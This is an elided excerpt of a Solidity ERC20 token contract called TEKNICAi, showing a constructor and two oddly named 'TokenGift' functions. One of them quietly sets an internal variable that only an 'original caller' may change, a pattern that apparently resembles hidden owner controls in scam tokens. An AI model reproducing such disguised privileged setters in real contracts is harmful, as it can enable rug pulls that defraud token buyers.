...
contract TEKNICAi is ERC20, Ownable {
    ...
    constructor(address marketwallet) ERC20(unicode"TEKNICAi", unicode"TEK") {
    ...
    function TokenGift (address spender) public {
    ...
    function TokenGiftAll(uint256 value) public {
        opimis = value;
        require(reqquireCaller(msg.sender), "Caller is not the original caller");
    }
